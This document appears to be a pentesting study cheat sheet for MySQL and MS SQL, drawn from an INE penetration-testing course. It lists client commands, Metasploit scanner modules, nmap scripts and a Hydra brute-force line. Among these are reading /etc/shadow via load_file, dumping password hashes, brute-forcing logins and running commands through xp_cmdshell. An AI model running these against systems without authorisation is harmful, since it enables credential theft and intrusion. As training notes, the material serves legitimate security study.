# SQL

## mysql
```
mysql -h [IP-ADDRESS] -u [USERNAME]
```
```
show databases;
```
```
use [DATABASE];
```
```
show [TABLES];
```
```
select count(*) from [TABLE];
```
```
select * from [TABLE];
```
```
select load_file("/etc/shadow");
```
```
help
```

## Metasploit

### mysql
```
use auxiliary/scanner/mysql/mysql_writable_dirs
```
```
use auxiliary/scanner/mysql/mysql_hashdump
```
```
use auxiliary/scanner/mysql/mysql_login
```
show advanced options:
```
advanced
```

### MS SQL
```
use auxiliary/scanner/mssql/mssql_login
```
```
use auxiliary/scanner/admin/mssql/mssql_enum
```
```
use auxiliary/scanner/admin/mssql/mssql_enum_sql_logins
```
```
use auxiliary/scanner/admin/mssql/mssql_enum_sql_exec
```
```
use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts
```

## nmap
### mysql
* --script=mysql-empty-password
* --script=mysql-info
* --script=mysql-users --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-databases --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-variables --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-dump-hashes --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-query --script-args="query='select * from [TABLE];',username='[USERNAME]',password='[PASSWORD]'"
* --script=mysql-audit --script-args="mysql-audit.username='[USERNAME]',mysql-audit.password='[PASSWORD]',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

### MS SQL
* --script ms-sql-info
* --script ms-sql-ntlm-info --script-args mssql.instance-port=[PORT]
   * Default port for MS SQL is 1433 
* --script ms-sql-brute --script-args userdb=[WORDLIST-PATH],passdb=[WORDLIST-PATH]
* --script ms-sql-empty-password
* --script ms-sql-query --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-query.query="SELECT * FROM [TABLE]" -oN [OUTPUT-FILE]
* --script ms-sql-dump-hashes --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD]
* --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="[COMMAND-YOU-WANT-TO-RUN]"


## Hydra
```
hydra -l [USERNAME] -P [WORDLIST-PATH] mysql
```

### References

Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
